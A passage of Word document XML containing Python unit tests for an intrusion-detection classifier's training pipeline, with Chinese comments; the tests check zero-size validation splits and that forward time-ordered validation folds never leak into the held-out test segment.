        </w:rPr>
        <w:t xml:space="preserve">        "decision_tree": {"selection_score": 0.9500},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04903C63">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FC5C624">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert saturation_note(separated) is None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35AF8AD6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert saturation_note({"only_one": {"selection_score": 0.99}}) is None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="356EFAD8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62971BAA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56BF5E8A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_split_by_time_accepts_zero_val():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2799F61B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """回归：前向滚动验证模式传 val_size=0，StandardScaler 不收 0 行数组会直接抛。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D9711FD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from models.train import split_and_scale</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49314C37">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C5200A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    rng = np.random.RandomState(0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25ABFF4F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X = rng.normal(size=(200, 3)).astype("float32")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79B0AF2A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    y = np.repeat([0, 1], 100)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F1F534">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    order = np.arange(200, dtype=float)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C2BDB4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2CB18D09">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X_train, X_val, X_test, *_ = split_and_scale(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75936998">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        X, y, test_size=0.1, val_size=0.0, seed=0, order=order</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A22076A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09BCD5C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert X_val.shape == (0, 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C56583">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert len(X_train) == 180 and len(X_test) == 20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7203D36D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70858823">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79C8FC0B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_forward_folds_never_touch_the_test_segment():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A5B501">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """回归：滚动验证一旦把最后 10% 漏进某一折，选型就提前看到了测试集，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A97A210">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    后面的"留出汇报"整段失效，而且日志完全正常。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="047F773C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from models.train import forward_folds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68CFF50C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2523153E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    rng = np.random.RandomState(0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B69C9B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    classes = ["BENIGN", "DDoS", "PortScan", "DoS Hulk"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1252240F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    y = np.repeat(classes, 100)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FBA22A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    order = rng.permutation(len(y))  # 每类内部的时间序号故意和行号无关</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="318C02CF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C3AD308">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    test_size = 0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254254A7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    folds = forward_folds(y, order, test_size, n_blocks=5, min_train_blocks=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4244A83D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert len(folds) == 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="120A9BE4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DB0EA1D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 每类最晚的 10% 是测试段，任何一折都不许碰</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1321A8D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    test_rows = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="448ABB04">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for cls in classes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="559A8359">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        idx = np.flatnonzero(y == cls)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19FEC2BA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        idx = idx[np.argsort(order[idx], kind="stable")]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F6F647D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        test_rows.update(idx[int(round(len(idx) * (1 - test_size))):].tolist())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B6FCEA5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="137BD212">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for tr, va in folds:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74EB2CA5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        assert not (set(tr.tolist()) &amp; set(va.tolist()))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D3FA8E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        assert not (set(tr.tolist()) &amp; test_rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72CCAB45">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        assert not (set(va.tolist()) &amp; test_rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D042A4B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F8B3FAD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 各折的验证块互不重叠，且训练块逐折变长</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F0FD7CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    val_sets = [set(va.tolist()) for _, va in folds]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2883D38C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert sum(len(s) for s in val_sets) == len(set().union(*val_sets))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B13DE96">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert [len(tr) for tr, _ in folds] == sorted(len(tr) for tr, _ in folds)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758DC20F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="111F18A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27E594BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_end_to_end_writes_artifacts(tmp_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B88DF9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    data = make_csv(tmp_path / "sample.csv", n_per_class=80)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD78BA3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out = tmp_path / "artifacts"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C566FEF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    code = main(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35136538">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="717A962F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "--data", str(data),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D447061">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "--out", str(out),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BEDDE01">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "--only", "decision_tree", "hybrid_forest",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19439D41">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
